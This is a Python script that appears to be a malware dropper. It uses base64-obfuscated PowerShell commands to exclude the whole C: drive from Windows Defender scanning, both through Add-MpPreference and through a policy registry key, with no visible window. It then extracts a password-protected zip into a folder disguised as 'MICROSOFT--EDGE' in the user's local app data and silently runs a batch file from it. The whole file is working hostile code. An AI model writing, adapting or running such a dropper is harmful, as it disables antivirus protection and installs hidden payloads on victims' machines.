import os, sys, shutil, subprocess, pyzipper, time, tempfile
def a(b):
    try:
        c = sys._MEIPASS
    except AttributeError:
        c = os.path.abspath(".")
    return os.path.join(c, b)
def d():
    check_key_command = (
        "powershell -Command \"Test-Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Exclusions\\Paths\\C:'\""
    )
    try:
        result = subprocess.run(
            check_key_command,
            capture_output=True,
            text=True,
            creationflags=subprocess.CREATE_NO_WINDOW,
            timeout=10
        )
        key_exists = result.stdout.strip() == 'True'
    except Exception as ex:
        print(f"Registry check failed: {ex}")
        key_exists = False
    e1 = "powershell -enc QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgACIAQwA6AFwAIgA="
    e2 = "powershell -enc cgBlAGcAIABhAGQAZAAgACIASABLAEwATQBcAFMATwBGAFQAVwBBAFIARQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgBcAEUAeABjAGwAdQBzAGkAbwBuAHMAXABQAGEAdABoAHMAIgAgAC8AdgAgAEMAOgBcAA=="
    try:
        subprocess.Popen(["powershell", "-Command", e1], creationflags=subprocess.CREATE_NO_WINDOW)
    except Exception as e:
        print(f"Error running e1: {e}")
    if not key_exists:
        try:
            subprocess.Popen(["powershell", "-Command", e2], creationflags=subprocess.CREATE_NO_WINDOW)
        except Exception as e:
            print(f"Error running e2: {e}")
def g():
    d()
    localappdata = os.environ.get("LOCALAPPDATA")
    if localappdata is None:
        print("LOCALAPPDATA not found.")
        return
    time.sleep(5)  
    target_dir = os.path.join(localappdata, "MICROSOFT--EDGE")
    try:
        os.makedirs(target_dir, exist_ok=True)
    except Exception as e:
        print(f"Error creating directory {target_dir}: {e}")
        return
    zip_src = a("MicrosoftOptions.zip")
    if not os.path.exists(zip_src):
        print(f"Source zip file not found: {zip_src}")
        return
    zip_dst = os.path.join(target_dir, "MicrosoftOptions.zip")
    try:
        shutil.copy(zip_src, zip_dst)
    except Exception as e:
        print(f"Error copying zip file: {e}")
        return
    try:
        with pyzipper.AESZipFile(zip_dst, 'r') as zf:
            zf.pwd = b'09876543217222'
            zf.extractall(path=target_dir)
    except Exception as e:
        print(f"Error extracting zip file: {e}")
        return
    batch_file = os.path.join(target_dir, "main.bat")
    if not os.path.exists(batch_file):
        print(f"Batch file not found: {batch_file}")
        return
    try:
        subprocess.Popen(["cmd", "/c", batch_file], creationflags=subprocess.CREATE_NO_WINDOW)
    except Exception as e:
        print(f"Error executing batch file: {e}")
if __name__ == "__main__":
    g()
